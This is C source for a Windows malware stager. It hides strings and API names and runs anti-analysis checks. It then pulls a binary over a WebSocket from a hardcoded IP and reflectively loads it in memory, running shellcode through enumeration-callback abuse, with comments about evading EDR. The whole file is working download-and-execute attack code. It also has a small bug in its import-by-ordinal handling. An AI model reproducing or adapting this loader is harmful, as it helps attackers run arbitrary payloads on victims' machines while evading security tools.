#include "wsl.h"
#include "anti.h" 

bool wsl_run_sc(PCORE c, PWSL_INFO wsl) {

    // Change protections

    DWORD old;
    c->api.VirtualProtect(wsl->base, wsl->img_sz, PAGE_EXECUTE_READ, &old);

#ifdef WSL_SC_ENUM_PWRSCHE

    if (!c->api.EnumPwrSchemes((PWRSCHEMESENUMPROC)wsl->base, 0)) {
		return false;
	}

#endif

#ifdef WSL_SC_ENUM_UILANGS

    if ( !c->api.EnumUILanguagesA((UILANGUAGE_ENUMPROCA)wsl->base, 0, 0) )
        return false;

#endif

#ifdef WSL_SC_ENUM_CODEPGS

    if ( !c->api.EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)wsl->base, CP_SUPPORTED) )
        return false;

#endif

    return true;
}

bool wsl_run_pe(PCORE c, PWSL_INFO wsl) {

    PIMAGE_DOS_HEADER dos_hdr       = NULL;
    PIMAGE_NT_HEADERS64 nt_hdr      = NULL;
    PIMAGE_OPTIONAL_HEADER opt_hdr  = NULL;

    dos_hdr = (PIMAGE_DOS_HEADER)wsl->base;
    nt_hdr  = (PIMAGE_NT_HEADERS64)(wsl->base + dos_hdr->e_lfanew);
    opt_hdr = &nt_hdr->OptionalHeader;

    UINT32 img_sz = opt_hdr->SizeOfImage;
    UINT32 entry = opt_hdr->AddressOfEntryPoint;

    // Change protections

    DWORD old;
    c->api.VirtualProtect(wsl->base, img_sz, PAGE_EXECUTE_READWRITE, &old); // If an EDR sees this it's  O V E R

    if ( wsl->type == DLL ) {

        WSLMAIN wsl_main = (WSLMAIN)( wsl->base + opt_hdr->AddressOfEntryPoint );
        wsl_main( (HMODULE)wsl->base, DLL_PROCESS_ATTACH, NULL );

    } else {

        // Create a new thread
        void ( WINAPI *wsl_entry )( void ) = (PVOID)( wsl->base + opt_hdr->AddressOfEntryPoint );
        HANDLE thread = c->api.CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)wsl_entry, 0, 0, NULL);
        c->api.WaitForSingleObject(thread, INFINITE);

    }

    return true;
}

bool wsl_run_bin(PCORE c, PWSL_INFO wsl) {

    // Execute the binary

    switch ( wsl->type ) {

        case BIN:
            wsl_run_sc(c, wsl);
            break;

        case DLL:
            wsl_run_pe(c, wsl);
            break;

        case EXE:
            wsl_run_pe(c, wsl);
            break;

        default:
            return false;

    }

    return true;
}

bool wsl_rel_bin(PCORE c, PWSL_INFO wsl) {

    if ( wsl->type == BIN )
        return true;

    PIMAGE_DOS_HEADER dos_hdr       = NULL;
    PIMAGE_NT_HEADERS64 nt_hdr      = NULL;
    PIMAGE_OPTIONAL_HEADER opt_hdr  = NULL;
    PIMAGE_DATA_DIRECTORY data_dir  = NULL;

    dos_hdr = (PIMAGE_DOS_HEADER)wsl->base;
    nt_hdr  = (PIMAGE_NT_HEADERS64)(wsl->base + dos_hdr->e_lfanew);
    opt_hdr = &nt_hdr->OptionalHeader;
    data_dir = opt_hdr->DataDirectory;

    UINT64 delta = ((UINT64)wsl->base) - opt_hdr->ImageBase;

    IMAGE_RELOC *reloc = NULL;
    IMAGE_BASE_RELOCATION *base_reloc = (IMAGE_BASE_RELOCATION *)(wsl->base + data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    while ( base_reloc->VirtualAddress != 0 ) {

        reloc = (IMAGE_RELOC *)(base_reloc + 1);
        UINT32 size = ( base_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / 2;

        for ( UINT32 i = 0; i < size; i++ ) {

            UINT64 *change = (UINT64 *)(wsl->base + base_reloc->VirtualAddress + reloc->Offset);

            switch ( reloc->Type ) {

                case IMAGE_REL_BASED_DIR64:
                    *change += delta;
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    break;
            }

            reloc++;
        }
        
        base_reloc = (IMAGE_BASE_RELOCATION *)reloc;
    }

    return true;

}

bool wsl_res_iat(PCORE c, PWSL_INFO wsl) {

    if ( wsl->type == BIN )
        return true;

    PVOID func_addr = NULL;

    PIMAGE_DOS_HEADER dos_hdr       = NULL;
    PIMAGE_NT_HEADERS64 nt_hdr      = NULL;
    PIMAGE_OPTIONAL_HEADER opt_hdr  = NULL;

    PIMAGE_DATA_DIRECTORY data_directory = NULL;
    PIMAGE_IMPORT_DESCRIPTOR import_descriptor = NULL;

    dos_hdr = (PIMAGE_DOS_HEADER)wsl->base;
    nt_hdr  = (PIMAGE_NT_HEADERS64)(wsl->base + dos_hdr->e_lfanew);
    opt_hdr = &nt_hdr->OptionalHeader;

    data_directory = opt_hdr->DataDirectory;
    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(wsl->base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while ( import_descriptor->Name ) {

        PCHAR mod_name = wsl->base + import_descriptor->Name;

        HMODULE mod = c->api.LoadLibraryA(mod_name);

        if ( !mod )
            return false;

        IMAGE_THUNK_DATA64 *f_thunk = (IMAGE_THUNK_DATA64 *)(wsl->base + import_descriptor->FirstThunk);
        IMAGE_THUNK_DATA64 *o_thunk = (IMAGE_THUNK_DATA64 *)(wsl->base + import_descriptor->OriginalFirstThunk);

        while ( o_thunk->u1.AddressOfData != 0 ) {

            if ( IMAGE_SNAP_BY_ORDINAL64(o_thunk->u1.Ordinal) ) {

                // Import by ordinal

                ULONG dro = IMAGE_ORDINAL64(o_thunk->u1.Ordinal);
                LONG ord = MAKELONG(ord, 0);
                func_addr = c->api.GetProcAddress(mod, (PCHAR)&ord);


            } else {

                // Import by name

                IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(wsl->base + o_thunk->u1.AddressOfData);
                PCHAR func_name = (PCHAR)(&ibn->Name);
                func_addr = c->api.GetProcAddress(mod, func_name);

            }

            if ( !func_addr )
                return false;

            f_thunk->u1.Function = (uint64_t)func_addr;
            
            f_thunk++;
            o_thunk++;
        }

        import_descriptor++;
    }

    return true;
}

bool wsl_map_bin(PCORE c, PWSL_INFO wsl) {

    if ( wsl->type == BIN )
        return true;

    IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)wsl->base;
    IMAGE_NT_HEADERS64 *nt_hdr = (IMAGE_NT_HEADERS64 *)(wsl->base + dos_hdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER *opt_hdr = &nt_hdr->OptionalHeader;

    PVOID data = c->api.VirtualAlloc(NULL, wsl->img_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if ( !data )
        return false;

    // Copy headers

    c->api.movemem(data, wsl->base, wsl->hdrs_sz);

    // Copy sections

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt_hdr);

    for ( WORD i = 0; i < wsl->num_sec; i++ ) {

        PVOID dst = (PVOID)(data + sec->VirtualAddress);
        PVOID src = (PVOID)(wsl->base + sec->PointerToRawData);

        if ( sec->SizeOfRawData > 0 ) {

            c->api.movemem(

                dst,
                src,
                sec->SizeOfRawData

            );

        } else {
            setmem(dst, 0, sec->Misc.VirtualSize);
        }
        sec++;
    }

    // Clean up free wsl->base

    wsl->base = data;

    return true;
}

bool wsl_vet_bin(PCORE c, PWSL_INFO wsl) {

    PIMAGE_DOS_HEADER dos_hdr = NULL;
    PIMAGE_NT_HEADERS64 nt_hdr = NULL;
    PIMAGE_OPTIONAL_HEADER opt_hdr = NULL;

    PVOID base = (PVOID)wsl->base;

    dos_hdr = (PIMAGE_DOS_HEADER)base;
    nt_hdr = (PIMAGE_NT_HEADERS64)(base + dos_hdr->e_lfanew);
    opt_hdr = &nt_hdr->OptionalHeader;

    if ( (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) || (nt_hdr->Signature != IMAGE_NT_SIGNATURE) ) {

        // No signatures found in binary assume it is shellcode

        wsl->base = base;
        wsl->type = BIN;

        return true;
    
    } else {

        // Signatures found.. Get PE information

        if ( (nt_hdr->FileHeader.Characteristics & IMAGE_FILE_DLL) == IMAGE_FILE_DLL ) {
            wsl->type = DLL;
        } else {
            wsl->type = EXE;
        }

        wsl->base = base;
        wsl->img_sz = opt_hdr->SizeOfImage;
        wsl->hdrs_sz = opt_hdr->SizeOfHeaders;
        wsl->num_sec = nt_hdr->FileHeader.NumberOfSections;

        return true;
    }

    return false;
}

int wsl_get_sz(PCORE c, HINTERNET ws) {

    DWORD bytes_read;
    CHAR buffer[WSL_MAX_BUFF];
    WINHTTP_WEB_SOCKET_BUFFER_TYPE buff_type;

    if ( c->api.WinHttpWebSocketReceive(ws, &buffer, WSL_MAX_BUFF, &bytes_read, &buff_type) != NO_ERROR )
        return 0;

    int bin_sz = 0;

    if ( !c->api.StrToIntExA(buffer, STIF_DEFAULT, &bin_sz) )
        return 0;

    return bin_sz;
}

bool wsl_get_bin(PCORE c, PWSL_INFO wsl) {

    // Get size of binary

    int sz = wsl_get_sz(c, wsl->ws);

    if ( !sz ) {
        c->api.WinHttpWebSocketClose(wsl->ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, 0, 0);
        return false;
    }

    PVOID ws_bin = c->api.VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if ( !ws_bin ) {
        c->api.WinHttpWebSocketClose(wsl->ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, 0, 0);
        return false;
    }

    size_t offset = 0;
    DWORD bytes_read;
    int bytes_left = sz;
    UCHAR buffer[WSL_MAX_BUFF];
    WINHTTP_WEB_SOCKET_BUFFER_TYPE buff_type;

    while ( bytes_left > 0 ) {

        setmem(buffer, 0, WSL_MAX_BUFF);

        if ( c->api.WinHttpWebSocketReceive(wsl->ws, &buffer, WSL_MAX_BUFF, &bytes_read, &buff_type) != NO_ERROR ) {
            return false;
        }

        if ( bytes_read <= 0 ) {
            break;
        }

        // Place bin in allocated buffer

        c->api.movemem(

            ws_bin + offset,
            buffer,
            bytes_read

        );

        bytes_left -= bytes_read;
        offset += bytes_read;
    }

    // Close the websocket connection

    c->api.WinHttpWebSocketClose(wsl->ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, 0, 0);

    wsl->base = ws_bin;
    wsl->img_sz = sz;

    return true;
}

bool wsl_get_ws(PCORE c, PWSL_INFO wsl) {

    // TODO: WSS

    HINTERNET ws = NULL;
    HINTERNET request = NULL;
    HINTERNET session_handle = NULL;
    HINTERNET session_connect = NULL;
    
    WCHAR get[] = { L'G', L'E', L'T', 0x0 };
    WCHAR str_ws[] = { L'/', L'w', L's', 0x0 };
    WCHAR user_agent[] = { L'T', L'e', L's', L't', 0x0 };
    WCHAR test_headers[] = { L'T', L'e', L's', L't', L':', L'w', L's', L'l', 0x0 };

    // Change this :)

    WCHAR home[] = { L'1', L'6', L'9', L'.', L'2', L'5', L'4', L'.', L'1', L'5', L'1', L'.', L'1', L'7', L'9', 0x0 };

    // Attempt to get a websocket handle

#ifdef WSL_SYS_PROXY
    session_handle = c->api.WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
#else
    session_handle = c->api.WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
#endif

    if (!session_handle)
        return false;

    session_connect = c->api.WinHttpConnect(session_handle, home, WSL_HOME_PORT, 0);

    if (!session_connect) {
        c->api.WinHttpCloseHandle(session_handle);
        return false;
    }

    request = c->api.WinHttpOpenRequest(session_connect, get, str_ws, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (!request) {
        c->api.WinHttpCloseHandle(session_handle);
        c->api.WinHttpCloseHandle(session_connect);
        return false;
    }

    if (!c->api.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
        c->api.WinHttpCloseHandle(session_handle);
        c->api.WinHttpCloseHandle(session_connect);
        c->api.WinHttpCloseHandle(request);
        return false;
    }

    if (!c->api.WinHttpAddRequestHeaders(request, (LPCWSTR)&test_headers, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        c->api.WinHttpCloseHandle(session_handle);
        c->api.WinHttpCloseHandle(session_connect);
        c->api.WinHttpCloseHandle(request);
        return false;
    }

    if (!c->api.WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, 0)) {
        c->api.WinHttpCloseHandle(session_handle);
        c->api.WinHttpCloseHandle(session_connect);
        c->api.WinHttpCloseHandle(request);
        return false;
    }

    if (!c->api.WinHttpReceiveResponse(request, 0)) {
        c->api.WinHttpCloseHandle(session_handle);
        c->api.WinHttpCloseHandle(session_connect);
        c->api.WinHttpCloseHandle(request);
        return false;
    }

    ws = c->api.WinHttpWebSocketCompleteUpgrade(request, 0);

    if (!ws) {
        c->api.WinHttpCloseHandle(session_handle);
        c->api.WinHttpCloseHandle(session_connect);
        c->api.WinHttpCloseHandle(request);
        return false;
    }

    c->api.WinHttpCloseHandle(session_handle);
    c->api.WinHttpCloseHandle(session_connect);
    c->api.WinHttpCloseHandle(request);

    wsl->ws = ws;

    return true;
}

bool wsl_init(PCORE c) {

    CHAR str_user32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0x0 };
    CHAR str_winhttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', 0x0 };
    CHAR str_Shlwapi[] = { 'S', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0x0 };
    CHAR str_PowrProf[] = { 'P', 'o', 'w', 'r', 'P', 'r', 'o', 'f', '.', 'd', 'l', 'l', 0x0 };
    
    // Get handles to ntdll.dll and kernel32.dll

    c->mod.nt   = get_mod_handle(H_NT);
    c->mod.k32  = get_mod_handle(H_K32);

    if ( !c->mod.nt || !c->mod.k32 )
        return false;

    // Get pointer to LoadLibrary

    c->api.LoadLibraryA  = (LoadLibraryA_t)get_proc_addr(c->mod.k32, H_LL);

    // Load needed libs

    c->api.LoadLibraryA(str_user32);
    c->api.LoadLibraryA(str_winhttp);
    c->api.LoadLibraryA(str_Shlwapi);
    c->api.LoadLibraryA(str_PowrProf);

    // More handles

    c->mod.http = get_mod_handle(H_HTTP);
    c->mod.shlw = get_mod_handle(H_SHLW);
    c->mod.msvc = get_mod_handle(H_MSVC);
    c->mod.powr = get_mod_handle(H_POWR);
    c->mod.u32  = get_mod_handle(H_US32);

    // More function pointers

    c->api.Sleep                    = (Sleep_t)get_proc_addr(c->mod.k32, H_SLEEP);
    c->api.movemem                  = (movemem_t)get_proc_addr(c->mod.k32, H_RTLMV);
    c->api.VirtualAlloc             = (VirtualAlloc_t)get_proc_addr(c->mod.k32, H_VA);
    c->api.StrToIntExA              = (StrToIntExA_t)get_proc_addr(c->mod.shlw, H_STI);
    c->api.ExitProcess              = (ExitProcess_t)get_proc_addr(c->mod.k32, H_EXITP);
    c->api.VirtualProtect           = (VirtualProtect_t)get_proc_addr(c->mod.k32, H_VP);
    c->api.GetProcAddress           = (GetProcAddress_t)get_proc_addr(c->mod.k32, H_GPA);
    c->api.FindWindowA              = (FindWindowA_t)get_proc_addr(c->mod.u32, H_FNDWNDA);
    c->api.Process32Next            = (Process32Next_t)get_proc_addr(c->mod.k32, H_PROC32N);
    c->api.Process32First           = (Process32First_t)get_proc_addr(c->mod.k32, H_PROC32F);
    c->api.CreateThread             = (CreateThread_t)get_proc_addr(c->mod.k32, H_MK_THREAD);
    c->api.EnumPwrSchemes           = (EnumPwrSchemes_t)get_proc_addr(c->mod.powr, H_ENUMPOWR);
    c->api.GetComputerNameA         = (GetComputerNameA_t)get_proc_addr(c->mod.k32, H_GETCNMA);
    c->api.WaitForSingleObject      = (WaitForSingleObject_t)get_proc_addr(c->mod.k32, H_WFSO);
    c->api.EnumUILanguagesA         = (EnumUILanguagesA_t)get_proc_addr(c->mod.k32, H_ENUMUILANGS);
    c->api.EnumSystemCodePagesA     = (EnumSystemCodePagesA_t)get_proc_addr(c->mod.k32, H_ENUMCODEPGS);
    c->api.QueryPerformanceCounter  = (QueryPerformanceCounter_t)get_proc_addr(c->mod.k32, H_QPREFCOUNT);
    c->api.CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)get_proc_addr(c->mod.k32, H_GETTL32SNAP);

    // WebSocket

    c->api.WinHttpOpen                      = (WinHttpOpen_t)get_proc_addr(c->mod.http, H_WH_OPEN);
    c->api.WinHttpConnect                   = (WinHttpConnect_t)get_proc_addr(c->mod.http, H_WH_CONN);
    c->api.WinHttpSetOption                 = (WinHttpSetOption_t)get_proc_addr(c->mod.http, H_WH_SETOP);
    c->api.WinHttpSendRequest               = (WinHttpSendRequest_t)get_proc_addr(c->mod.http, H_WH_SNDREQ);
    c->api.WinHttpOpenRequest               = (WinHttpOpenRequest_t)get_proc_addr(c->mod.http, H_WH_OPNREQ);
    c->api.WinHttpCloseHandle               = (WinHttpCloseHandle_t)get_proc_addr(c->mod.http, H_WH_CLSHNDL);
    c->api.WinHttpWebSocketClose            = (WinHttpWebSocketClose_t)get_proc_addr(c->mod.http, H_WH_WSSCLS);
    c->api.WinHttpReceiveResponse           = (WinHttpReceiveResponse_t)get_proc_addr(c->mod.http, H_WH_RCVRSP);
    c->api.WinHttpWebSocketReceive          = (WinHttpWebSocketReceive_t)get_proc_addr(c->mod.http, H_WH_WSSRCV);
    c->api.WinHttpAddRequestHeaders         = (WinHttpAddRequestHeaders_t)get_proc_addr(c->mod.http, H_WH_ADDRQHDR);
    c->api.WinHttpWebSocketCompleteUpgrade  = (WinHttpWebSocketCompleteUpgrade_t)get_proc_addr(c->mod.http, H_WH_WSSUPG);

    return true;
}

void start() {

    CORE c = { 0 };
    WSL_INFO wsl = { 0 };

    if ( !wsl_init(&c) )
        return;

    if ( !wsl_run_checks(&c) )
        c.api.ExitProcess(0);

    if ( !wsl_get_ws(&c, &wsl) )
        c.api.ExitProcess(0);

    if ( !wsl.ws )
        c.api.ExitProcess(0);

    if ( !wsl_get_bin(&c, &wsl) )
        c.api.ExitProcess(0);

    if ( !wsl_vet_bin(&c, &wsl) )
        c.api.ExitProcess(0);

    if ( !wsl_map_bin(&c, &wsl) )
        c.api.ExitProcess(0);

    if ( !wsl_res_iat(&c, &wsl) )
        c.api.ExitProcess(0);

    if ( !wsl_rel_bin(&c, &wsl) )
        c.api.ExitProcess(0);

    if ( !wsl_run_bin(&c, &wsl) )
        c.api.ExitProcess(0);

}
